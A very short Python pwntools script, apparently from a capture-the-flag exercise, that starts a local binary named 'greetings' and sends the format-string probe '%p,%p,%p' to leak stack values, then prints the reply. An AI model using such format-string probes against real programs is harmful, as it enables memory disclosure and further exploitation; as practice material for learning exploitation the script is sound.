#!/usr/bin/env python3

from pwn import *
io = process('./greetings')
print(io.recvregex(b':'))
io.sendline(b'%p,%p,%p')
io.recvline()
print(io.recvline())
io.recvuntil(b'foo')